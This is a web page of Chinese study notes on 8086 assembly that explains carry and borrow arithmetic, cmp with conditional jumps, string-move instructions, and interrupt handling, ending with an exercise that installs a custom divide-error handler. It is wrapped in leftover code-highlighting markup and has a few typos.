class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2</span><br><span class="line">mov bx,1</span><br><span class="line">sub bx,ax</span><br><span class="line">adc ax,1</span><br><span class="line">执行后：(ax)=4</span><br><span class="line"></span><br><span class="line">adc执行时，相当于计算：</span><br><span class="line">(ax)+1+CF=2+1+1=4</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240728212323510.png" alt="image-20240728212323510"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240728215919208.png" alt="image-20240728215919208"></p><p>1111 1111补码相当于-1</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240728212837878.png" alt="image-20240728212837878"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">add ax,ax</span><br><span class="line">adc ax,3</span><br><span class="line">执行后，(ax)=5</span><br><span class="line"></span><br><span class="line">adc执行时，相当于计算:</span><br><span class="line">(ax)+3+CF=2+3+0=5。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov al,98H</span><br><span class="line">add al,al</span><br><span class="line">adc al,3</span><br><span class="line">执行后，(ax)=34H</span><br><span class="line"></span><br><span class="line">adc执行时，相当于计算:</span><br><span class="line">(ax)+3+CF=30H+3+1=34H</span><br></pre></td></tr></table></figure></li><li><p>在执行 adc 指令的时候加上的 CF 的值的含义，由adc指令前面的指令决定的，也就是说，关键在于所加上的CF值是被什么指令设置的</p></li><li><p>显然，如果CF 的值是被sub指会设置的，那么它的含义就是借位值;如果是被add指令设置的，那么它的含义就是进位值。</p></li></ul><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240728213228509.png" alt="image-20240728213228509"></p><ul><li><pre><code>add ax,bxadd al,bladc ah,bh<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  上述两段代码有相同的作用</span><br><span class="line"></span><br><span class="line">* cpu提供adc指令的目的，就是来进行加法的第二步运算</span><br><span class="line"></span><br><span class="line">* adc和add配合可以进行更大数据的加法运算</span><br><span class="line"></span><br><span class="line">**adc 论调**</span><br><span class="line"></span><br><span class="line">* 由于有这样的功能，我们就可以对任意大的数据进行加法运算</span><br><span class="line"></span><br><span class="line">**adc指令实践**</span><br><span class="line"></span><br><span class="line">如果要进行128位的数据相加怎么办？</span><br><span class="line"></span><br><span class="line">* 参数：</span><br><span class="line">* ds:si指向存储第一个数的内存空间，因数据为128位，所以需要8个字单元，由低地址单元到高地址单元依次存放 128位数据由低到高的各个字。运算结果存储在第一个数的存储空间中。</span><br><span class="line"></span><br><span class="line">* ds:di指向存储第二个数的内存空间</span><br><span class="line"></span><br><span class="line">**注意**</span><br><span class="line"></span><br><span class="line">* inc和loop指令不影响CF位，上面的程序中不能用add因为会影响CF位</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre></li></ul><p>汇编语言中影响CF位的指令包括加法类指令，减法类指令，取补指令，以及比较指令</p><p>加法类指令：括不带进位的加法（add）和带进位的加法（adc）,这些指令在执行加法运算时会影响CF位。具体来说，当执行加法操作时，如果结果需要进位，则CF位被设置为1；否则，CF位被设置为0。</p><p>减法类指令：包括不带借位的减法（sub）和带借位的减法（sbb），这些指令在执行减法运算时同样会影响CF位。当执行减法操作时，如果被减数小于减数，导致需要借位，则CF位被设置为1；否则，CF位被设置为0。</p><p>取补指令：取补指令（neg）用于对一个数取反后加一，这个操作也会影响CF位。具体来说，当操作数为正数时，执行取补操作后CF位被设置为0；当操作数为负数时，执行取补操作后CF位的设置则取决于具体的操作数。</p><p>比较指令：比较指令（cmp）用于比较两个数的大小，不保存结果。这个指令通过减去第二个操作数来更新标志位，包括CF位。比较的结果可以通过检查ZF（零标志位）来确定两个数是否相等，而CF位则反映了比较过程中是否发生了借位或进位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 11.7 sbb指令</span><br><span class="line"></span><br><span class="line">* sbb是带借位减法指会，它利用了CF位上记录的借位值。</span><br><span class="line"></span><br><span class="line">  * 格式: `sbb 操作对象1,操作对象2`</span><br><span class="line"></span><br><span class="line">  * 功能:</span><br><span class="line">    操作对象1=操作对象-操作对象2-CF</span><br><span class="line"></span><br><span class="line">  * 比如:`sbb ax,bx` 实现的功能是:</span><br><span class="line">    (ax)=(ax)-(bx)-CF</span><br><span class="line"></span><br><span class="line">* 利用sbb指令我们可以对任意大的数据进行减法运 。</span><br><span class="line"></span><br><span class="line">* sbb和adc是基于同样的思想设计的两条指令，在应用思路上和adc类似。在这里，我们就不再进行过多的讨论。</span><br><span class="line"></span><br><span class="line">### 11.8 cmp指令</span><br><span class="line"></span><br><span class="line">* cmp 是比较指令，功能相当于减法指令，只是不保存结果。</span><br><span class="line"></span><br><span class="line">* cmp 指令执行后，将对标志寄存器产生影响。</span><br><span class="line"></span><br><span class="line">* 其他相关指令通过识别这些被影响的标志寄存器位来得知比较结果。</span><br><span class="line"></span><br><span class="line">* **比如**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  cmp ax,ax<br>  做(ax)-(ax)的运算，结果为0，但并不在ax中保存，仅影响flag的相关各位。<br>  指令执行后<br>  ZF&#x3D;1&#x2F;&#x2F;是否产生0<br>  PF&#x3D;1&#x2F;&#x2F;1有多少个，偶数为1<br>  SF&#x3D;0<br>  CF&#x3D;0<br>  OF&#x3D;0<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">我们通过相关标志位的值就可以看出比较的结果</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>  cmp ax,bx<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">  ![image-20240729202523805](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240729202523805.png)</span><br><span class="line">  </span><br><span class="line">* 比较指令的设计思路</span><br><span class="line"></span><br><span class="line">  通过做减法运算，影响标志寄存器，标志寄存器的相关位记录了比较的结果。</span><br><span class="line"></span><br><span class="line">  ![image-20240729203038918](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240729203038918.png)</span><br><span class="line"></span><br><span class="line">* 同 add、sub 指令一样，CPU 在执行cmp指令的时候，也包含两种含义:</span><br><span class="line">  进行无符号数运算和进行有符号数运算</span><br><span class="line">* 所以利用cmp指令可以对无符号数进行比较，也可以对有符号数进行比较。</span><br><span class="line"></span><br><span class="line">* 无论是进行无符号数运算和进行有符号数运算ZF为1是都表示相等</span><br><span class="line"></span><br><span class="line">* 进行**有符号运算**的时候可以通过观察`SF`标志位，若是结果为负，SF=1</span><br><span class="line"></span><br><span class="line">* ```</span><br><span class="line">  (ah)=22H ，(bh)=0AOH</span><br><span class="line">  则(ah)-(bh)=34-(-96)=130-82H</span><br><span class="line">  82H是-126的补码，所以SF=1</span><br><span class="line">  </span><br><span class="line">  这里虽然SF=1，但是并不能说明(ah)&lt;(bh)，因为显然34&gt;-96。</span><br></pre></td></tr></table></figure></p><ul><li><p>两个有符号数A 和B 相减，得到的是负数，那么可以肯定A&lt;B，这个思路没有错误</p></li><li><p>如果没有溢出发生的话，那么，实际结果的正负和逻辑上真正结果的正负就一致了</p></li><li><p>所以，我们应该在考察SF(得知实际结果的正负)的同时考察OF(得知有没有溢出)，就可以得知逻辑上真正结果的正负，同时就可以知道比较的结果</p></li><li><p>如果SF&#x3D;1，而OF&#x3D;0<br>OF&#x3D;0，说明没有溢出，逻辑上真正结果的正负&#x3D;实际结果的正负;<br>因SF&#x3D;1，实际结果为负，所以逻辑上真正的结果为负，所以(ah)&lt;(bh)。</p></li><li><p>如果SF&#x3D;1，而OF&#x3D;1<br>OF&#x3D;1，说明有溢出，逻辑上真正结果的正负≠实际结果的正负<br>简单分析一下，就可以看出，如果因为溢出导致了实际结果为负，那么逻辑上真正的结果必然为正。这样，SF-1，OF&#x3D;1，说明了(ah)&gt;(bh)。</p></li><li><p>如果SF&#x3D;0，而OF&#x3D;1<br>OF&#x3D;1，说明有溢出，逻辑上真正结果的正负≠实际结果的正负<br>简单分析一下，就可以看出，如果因为溢出导致了实际结果为正，那么逻辑上真正的结果必然为负。这样，SF-0，OF&#x3D;1，说明了(ah)&lt;(bh)</p></li><li><p>如果SF&#x3D;0，而OF&#x3D;0<br>OF&#x3D;0，说明没有溢出，逻辑上真正结果的正负&#x3D;实际结果的正负;<br>因SF&#x3D;0，实际结果非负，所以逻辑上真正的结果必然非负。所以(ah)&gt;&#x3D;(bh)</p></li></ul><h3 id="11-9检测比较结果的条件转移指令"><a href="#11-9检测比较结果的条件转移指令" class="headerlink" title="11.9检测比较结果的条件转移指令"></a>11.9检测比较结果的条件转移指令</h3><ul><li>因为 cmp 指令可以同时进行两种比较，无符号数比较和有符号数比较，所以根据 cmp 指令的比较结果进行转移的指令也分为两种，即:</li><li>根据无符号数的比较结果进行转移的条件转移指令，它们检测ZF、CF的值;</li><li>根据有符号数的比较结果进行转移的条件转移指令，它们检测 SF、OF和 ZF的值。</li></ul><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240729210503979.png" alt="image-20240729210503979"></p><ul><li><p>这些指令比较常用，它们都很好记忆，它们的第一个字母都是j，表示jump，后面的</p><ul><li>e:表示equal</li><li>ne:表示not equal</li><li>b:表示below</li><li>nb:表示not below</li><li>a:表示above </li><li>na:表示not above</li></ul></li><li><p>注意观察一下它们所检测的标志位，都是cmp指令进行无符号数比较时候，记录比较结果的标志位。</p></li><li><p>虽然je的逻辑含义是“相等则转移”，但它进行的操作是，ZF&#x3D;1时则转移。</p></li><li><p>“相等则转移”这种逻辑含义，是通过和 cmp 指令配合使用来体现的，因为是cmp 指令为“ZF&#x3D;1”赋予了“两数相等”的含义。</p></li><li><p>是否在<code>je</code>前使用cmp指令在于我们的安排</p></li><li><p><code>je</code>检测的是ZF位置，不管 <code>je</code> 前面是什么指令只要CPU执行<code>je</code>指令时ZF&#x3D;1，那么就会发生转移。</p></li><li><p>对于<code>jne、jb、jnb、ja、jna</code>等指令和cmp指令配合使用的思想和 <code>je</code> 相同，可以自己分析一下。</p></li><li><p>根据有符号数的比较结果进行转移的条件转移指令的工作原理和无符号的相同，只是检测了不同的标志位。</p></li><li><p>我们在这里主要探讨的是cmp，标志寄存器的相关位、条件转移指令三者配合应用的原理这个原理具有普遍性，而不是逐条讲解条件转移指令</p></li></ul><h3 id="11-10-DF标志和串转送指令"><a href="#11-10-DF标志和串转送指令" class="headerlink" title="11.10 DF标志和串转送指令"></a>11.10 DF标志和串转送指令</h3><ul><li><p>flag的第10位是DF，方向标志位。</p></li><li><p>在串处理指会中，控制每次操作后si，di的增减。</p></li><li><p>DF&#x3D;0:每次操作后si，di递增;</p></li><li><p>DF&#x3D;1:每次操作后si，di递减。</p></li><li><pre><code>movsb<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  功能：以字节为单位传送</span><br><span class="line"></span><br><span class="line">  * ((es)x16 +(di))=((ds)x16+(si))</span><br><span class="line">  * 如果DF=0则:(si)=(si)+1     (di)=(di)+ 1</span><br><span class="line">  * 如果DF=1则:(si)=(si)-1     (di)=(di)-1s</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  * `movsb` 的功能是将 ds:si 指向的内存单元中的字节送入 es:di中，然后根据标志寄存器DF位的值，将 si和di递增或递减。</span><br><span class="line"></span><br><span class="line">* ```</span><br><span class="line">  movsw</span><br></pre></td></tr></table></figure>功能：以字为单位传送* 将 ds:si指向的内存字单元中word送入es:di中然后根据标志寄存器DF位的值，将si和di递增2或递减2。</code></pre></li><li><p><code>movsb</code>和<code>movsw</code>进行的是串传送操作中的一个步骤，一般来说，<code>movsb</code>和<code>movsw</code>都和<code>rep</code>配合使用，格式如下:<code>rep movsb</code>，<code>rep</code>的作用是根据cx的值，重复执行后面的串传送指令。</p></li><li><p>由于每执行一次<code>movsb</code>指令<code>si</code>和<code>di</code>都会递增或递减指向后一个单元或前个单元，则<code>rep movsb</code>就可以循环实现(cx)个字符的传送。</p></li><li><p>由于<code>flag</code>的<code>DF</code>位决定着串传送指会执行后，<code>si</code>和<code>di</code>改变的方向，所以<code>CPU</code>应该提供相应的指令来对<code>DF</code>位进行设置，从而使程序员能够决定传送的方向。</p></li><li><p>8086CPU提供下而两条指会对DF位进行设置</p><ul><li><code>cld</code>指令:将标志寄存器的DF位置0</li><li><code>std</code>指会:将标志寄存器的DF位置1</li></ul></li><li><p>使用串传送指会进行数据的传送，需要给它提供一些必要的信息，它们是:</p><ul><li>传送的原始位置: <code>ds:si</code>:</li><li>传送的目的位置: <code>es:di</code>;</li><li>传送的长度:cx</li><li>传送的方向:DF</li></ul></li></ul><h3 id="11-11-pushf和popf"><a href="#11-11-pushf和popf" class="headerlink" title="11.11 pushf和popf"></a>11.11 pushf和popf</h3><ul><li><p>pushf:将标志寄存器的值压栈;</p></li><li><p>popf:从栈中弹出数据，送入标志寄存器中。</p></li><li><p>pushf和popf,为直接访问标志寄存器提供了一种方法。</p></li></ul><h2 id="12-内中断"><a href="#12-内中断" class="headerlink" title="12. 内中断"></a>12. 内中断</h2><ul><li><p>中断是CPU处理外部突发事件的一个重要技术</p></li><li><p>它能使CPU在运行过程中对外部事件发出的中断请求及时地进行处理,处理完成后又立即返回断点，继续进行CPU原来的工作。</p></li></ul><h3 id="12-1-内中断的产生"><a href="#12-1-内中断的产生" class="headerlink" title="12.1 内中断的产生"></a>12.1 内中断的产生</h3><ul><li><p>引起中断的原因或者说发出中断请求的来源叫做中断源。根据中断源的不同，可以把中断分为硬件中断和软件中断两大类，而硬件中断又可以分为外部中断和内部中断两类。</p></li><li><p>外部中断一般是指由计算机外设发出的中断请求，如:键盘中断、打印机中断、定时器中断等。外部中断是可以屏蔽的中断，也就是说利用中断控制器可以屏蔽这些外部设备的中断请求。</p></li><li><p>内部中断是指因硬件出错(如突然掉电、奇偶校验错等)或运算出错(除数为零、运算溢出、单步中断等)所引起的中断。内部中断是不可屏蔽的中断。</p></li><li><p>软件中断其实并不是真正的中断，它们只是可被调用执行的一般程序以及DOS的系统功能调用(INT 21H)等都是软件中断。</p></li><li><p>CPU为了处理并发的中断请求，规定了中断的优先权，中断优先权由高到低的顺序是:(1)除法错误、溢出中断、软件中断 (2)不可屏蔽中断(3)可屏蔽中断 (4)单步中断。</p></li></ul><h3 id="12-2-中断处理程序"><a href="#12-2-中断处理程序" class="headerlink" title="12.2 中断处理程序"></a>12.2 中断处理程序</h3><ul><li><p>CPU的设计者必须在中断信息和其处理程序的入口地址之间建立某种联系，使得CPU根据中断信息可以找到要执行的处理程序。</p></li><li><p>我们知道，中断信息中包含有标识中断源的类型码。根据CPU的设计，中断类型码的作用就是用来定位中断处理程序</p></li><li><p>比如CPU 根据中断类型码4，就可以找到4号中断的处理程序。</p></li><li><p>可随之而来的问题是，若要定位中断处理程序，需要知道它的段地址和偏移地址，而如何根据 8位的中断类型码(8086中断类型码为一个字节)得到中断处理程序的段地址和偏移地址呢? 这就要引入“中断向量表”了。</p></li></ul><h3 id="12-3-中断向量表"><a href="#12-3-中断向量表" class="headerlink" title="12.3 中断向量表"></a>12.3 中断向量表</h3><ul><li><p>CPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址。</p></li><li><p>中断向量表就是中断向量的列表</p></li><li><p>中断向量表在内存中保存，其中存放着 256个中断源所对应的中断处理程序的入口，如下图所示:</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240729225113104.png" alt="image-20240729225113104"></p></li><li><p>中断向量表在内存中存放，对于8086cpu机，中断向量表指定放在内存地址0处</p></li><li><p>从内存0000:0000到0000:03FF的1024个单元中存放着中断向量表。</p></li></ul><p><strong>测试点总结</strong></p><p>在中断向量表中，一个表项占两个字，高地址字存放段地址，低地址字存放偏移地址。</p><h3 id="12-4-中断过程"><a href="#12-4-中断过程" class="headerlink" title="12.4 中断过程"></a>12.4 中断过程</h3><ul><li><p>可以用中断类型码，在中断向量表中找到中断处理程序的入口</p></li><li><p>找到这个入口地址的最终目的是用它设置CS和IP，使CPU执行中断处理程序。</p></li><li><p>用中断类型码找到中断向量，并用它设置CS和IP，这个互作是由CPU的硬件自动完成的。</p></li><li><p>CPU 硬件完成这个工作的过程被称为中断过程</p></li><li><p>8086CPU的中断过程:</p><ul><li>(1)(从中断信息中)取得中断类型码</li><li>(2)标志寄存器的值入栈(保护标志位)</li><li>(3)设置标志寄存器的第8位TF 和第9位IF的值为0   (这一步的目的后面将介绍)</li><li>(4)CS的内容入栈;</li><li>(5)IP的内容入栈;</li><li>(6)从内存地址为中断类型码*4和中断类型码 *4+2 的两个字单元中读取中断处理程序的入口地址设置IP和CS·</li></ul></li><li><p>可以看到CPU将CS、IP保存在栈中。</p></li><li><p>我们注意到，在中断过程中还要做的一个工作就是设置标志寄存器的TF、IF位。</p></li><li><p>我们更简洁的描述中断过程，如下:</p><ul><li><p>(1)取得中断类型码N;</p></li><li><p>(2)<code>pushf</code></p></li><li><p>(3)<code>TF=0，IF=0</code></p></li><li><p>(4)<code>push CS</code></p></li><li><p>(5)<code>push IP</code></p></li><li><p>(6)<code>(IP)=(N*4),(CS)=(N*4+2)</code></p><p>在最后一步完成后，CPU 开始执行由程序员编写的中断处理程序。</p></li></ul></li></ul><h3 id="12-5-中断处理程序和iret指令"><a href="#12-5-中断处理程序和iret指令" class="headerlink" title="12.5 中断处理程序和iret指令"></a>12.5 中断处理程序和iret指令</h3><ul><li><p>由于CPU随时都可能检测到中断信息，也就是说，CPU 随时都可能执行中断处理程序，所以中断处理程序必须一直存储在内存某段空间</p></li><li><p>而中断处理程序的入口地址，即中断向量，必须存储在对应的中断向量表表项中。</p></li><li><p>中断处理程序的编写方法和子程序的比较相似，下面是常规的步骤:</p><ul><li><p>(1)保存用到的寄存器。</p></li><li><p>(2)处理中断。</p></li><li><p>(3)恢复用到的寄存器。</p></li><li><p>(4)用 iret 指令返回。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iret指令的功能用汇编语法描述为</span><br><span class="line">pop IP</span><br><span class="line">pop CS</span><br><span class="line">popf</span><br></pre></td></tr></table></figure><ul><li>iret通常和硬件自动完成的中断过程配合使用。</li><li>可以看到，在中断过程中，寄存器入栈的顺序是标志寄存器、CS、IP ，而iret的出栈顺序是IP、CS、标志寄存器，刚好和其对应，实现了用执行中断处理程序前的CPU到现场恢复标志寄存器和CS、IP的互作。</li><li>iret指令执行后，CPU回到执行中断处理程序前的执行点继续执行程序。</li></ul></li></ul></li></ul><h3 id="12-6-除法错误中断的处理"><a href="#12-6-除法错误中断的处理" class="headerlink" title="12.6 除法错误中断的处理"></a>12.6 除法错误中断的处理</h3><ul><li><p>下面的内容中，我们通过对 0号中断，即除法错误的中断处理，来体会一下前面所讲的内容</p></li><li><p>当CPU执行div等除法指令的时候，如果发生了除法溢出错误，将产生中断类型码为0的中断信息，CPU将检测到这个信息，然后引发中断过程，转去执行0号中断所对应的中断处理程序。</p></li></ul><p><strong>示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,1000h</span><br><span class="line">mov bh,1</span><br><span class="line">div bh</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240730173358692.png" alt="image-20240730173358692"></p><p>虽然没有提示，但是我们查看中断向量表可以发现跳转的地址是0号储存的</p><h3 id="12-7-编译处理0号中断"><a href="#12-7-编译处理0号中断" class="headerlink" title="12.7 编译处理0号中断"></a>12.7 编译处理0号中断</h3><ul><li><p>现在我们考虑改变一下0号中断处理程序的功能，即重新编写一个0号中断处理程序，它的功能是在屏幕中间显示“Welcome to debug“的语句，然后返回到操作系统。</p></li><li><p>程序分析</p><p>一，当发生除法溢出的时候，产生0号中断信息，从而引发中断过程</p><ul><li>此时，CPU将进行以下工作:</li><li>取得中断类型码0;</li><li>标志寄存器入栈，TF、IF设置为0:</li><li>CS、IP入栈;</li><li><code>(IP)=(0*4)，(CS)=(0*4+2)</code></li></ul><p>二，可见，当中断0发生时，CPU将转去执行中断处理程序。</p><ul><li>只要按如下步骤编写中断处理程序，当中断0发生时，即可显示“Welcome to debug“</li><li>相关处理。</li><li>向显示缓冲区送字符串“Welcome to debug“</li><li>返回DOS</li></ul><p>我们将这段程序称为<code>do0</code></p><p>三，现在的问题是:do0 应放在内存中。</p><ul><li><p>因为除法溢出随时可能发生，CPU随时都可能将 CS:IP指向 do0的入口，执行程序。</p></li><li><p>由于我们是在操作系统之上使用计算机，所有的硬件资源都在操作系统的管理之下，所以我们要想得到一块内存存放do0，应该向操作系统申请。</p></li><li><p>但在这里出于两个原因我们不想这样做</p><ul><li>原因之一:过多地讨论申请内存将偏离问题主线</li><li>原因之二:我们学习汇编的一个重要目的就是要获得对计算机底层的编程体验</li></ul></li><li><p>所以，在可能的情况下，我们不去理会操作系统，而直接面向硬件资源。</p></li><li><p>问题变得简单而直接，我们只需找到一块别的程序不会用到的内存区，将do0传送到其中即可</p></li><li><p>前面讲到，内存0000:0000~0000:03FF，大小为1KB的空间是系统存放中断处理程序入口地址的中断向量表。一般情况下，从0000:0200至0000:02FF的256个字节的空间所对应的中断向量表项都是空的，操作系统和其他应用程序都不占用。</p></li><li><p>根据以前的编程经验，我们可以估计出，do0的长度不可能超过256个字节。</p></li><li><p><strong>结论</strong>:我们可以将do0传送到内存0000:0200处。</p></li></ul><p>四，我们将中断处理程序do0放到 0000:0200后，若要使得除法溢出发生的时候，CPU转去执行do0，则必须将do0的入口地址。即0000:0200登记在中断向量表的对应表项中</p><ul><li>因为除法溢出对应的中断类型码为0，它的中断处理程序的入口地址应该从0x4地址单元开始存放，段地址存放在 0x4+2 字单元中，偏移地址存放在0x4字单元中。</li><li>也就是说要将do0的段地址0存放在 0000:0002字单元中 ，将偏移地址200H存放在0000:0000字单元中。</li></ul></li><li><p>我们需要做的事</p><ul><li>(1)编写可以显示“Welcome to debug”的中断处理程序:do0;</li><li>(2)将do0送入内存0000:0200处;</li><li>(3)将do0的入口地址0000:0200存储在中断向表0号表项中。</li></ul><p>程序框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">do0安装程序</span><br><span class="line">设置中断向量表</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">do0:</span><br><span class="line">显示字符串“Welcome to debug”</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><ul><li>我们可以看到，上面的程序分为两部分:<ul><li>(1)安装do0，设置中断向量的程序</li><li>(2)do0</li></ul></li><li>程序执行时，do0的代码是不执行的，它只是作为do0安装程序所要传送的数据。</li><li>执行do0安装程序，将do0 的代码拷贝到内存0:200处，然后设置中断向量表，即偏移地址200H和段地址0，保存在0号表项中。这两部<br>分工作完成后，程序就返回了</li><li>程序的目的就是在内存0:200处安装do0 的代码，将0号中断处理程感的入口地址设置为0:200。</li><li>do0的代码虽然在程序中，却不在程序执行的时候执行。它是在除法溢出发生的时候才得以执行的中断处理程序。</li><li>do0部分代码的最后两条指令是依照我们的编程要求，用来返回DOS的。</li></ul></li></ul><h3 id="12-8-安装"><a href="#12-8-安装" class="headerlink" title="12.8 安装"></a>12.8 安装</h3><ul><li><p>可以使用movsb指令，将do0的代码送入0:200处</p></li><li><p>用rep movsb指令的时候需要确定的信息:</p><ul><li>(1)传送的原始位置，段地址:code，偏移地址:offset do0 ;</li><li>(2)传送的目的位置:0:200;</li><li>(3)传送的长度:do0部分代码的长度;</li><li>(4)传送的方向:正向。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,offset do0</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,200H</span><br><span class="line">mov cx,do0长度</span><br><span class="line">cld</span><br><span class="line">rep movsb</span><br><span class="line">设置中断向量表</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">do0:</span><br><span class="line">显示字符串“Welcome to debug”</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></li><li><p>如何确定cx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,offset do0</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,200H</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov cx,offset do0end - offset do0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cld</span><br><span class="line">rep movsb</span><br><span class="line">设置中断向量表</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line"></span><br><span 